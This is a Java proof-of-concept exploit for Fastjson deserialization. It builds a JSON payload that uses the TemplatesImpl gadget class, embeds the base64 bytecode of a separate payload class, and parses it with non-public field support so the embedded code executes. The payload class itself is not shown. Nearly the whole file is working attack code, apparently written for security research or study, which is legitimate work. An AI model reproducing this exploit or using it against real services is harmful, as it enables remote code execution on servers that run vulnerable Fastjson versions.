package cc.blbana.TemplatesImpl;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class FJPoC {
    public static void PoC() throws Exception {

        ParserConfig config = new ParserConfig();
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        final String payloadClassPath = FJPoC.class.getResource("FJPayload.class").getPath().substring(1);
        System.out.println(payloadClassPath);
        final String GADGAT_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String byteCode = readClassFile(payloadClassPath);

        String PoC = "{\"@type\":\"" + GADGAT_CLASS + "\",\"_bytecodes\":[\"" + byteCode + "\"],'_name':'a.b','_tfactory':{},\"_outputProperties\":{ }," + "\"_name\":\"a\",\"allowedProtocols\":\"all\"}\n";
        System.out.println(PoC);
        Object object = JSON.parseObject(PoC, Object.class, config, Feature.SupportNonPublicField);

    }

    public static String readClassFile(String class_path) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        if (!Files.exists(Paths.get(class_path).toAbsolutePath()))
            System.out.println("[ERROR] FileNotFound : " + class_path);
        Files.copy(Paths.get(class_path), out);
        return Base64.getEncoder().encodeToString(out.toByteArray());
    }

    public static void main(String[] args) {
        try {
            PoC();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
